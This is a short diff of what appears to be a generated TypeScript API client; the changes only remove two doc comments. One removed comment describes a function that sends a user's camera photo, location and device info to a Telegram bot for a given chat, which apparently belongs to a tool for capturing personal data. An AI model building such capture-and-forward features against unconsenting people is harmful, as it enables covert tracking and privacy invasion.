@@ -62,7 +62,6 @@ export const getHealthCheckUrl = () => {
 }
 
 /**
- * Returns server health status
  * @summary Health check
  */
 export const healthCheck = async ( options?: RequestInit): Promise<HealthStatus> => {
@@ -140,7 +139,6 @@ export const getSubmitCaptureUrl = () => {
 }
 
 /**
- * Receives camera photo, location, and device info and sends it to the Telegram bot for the given chat_id
  * @summary Submit captured user data to Telegram bot
  */
 export const submitCapture = async (captureData: CaptureData, options?: RequestInit): Promise<CaptureResult> => {
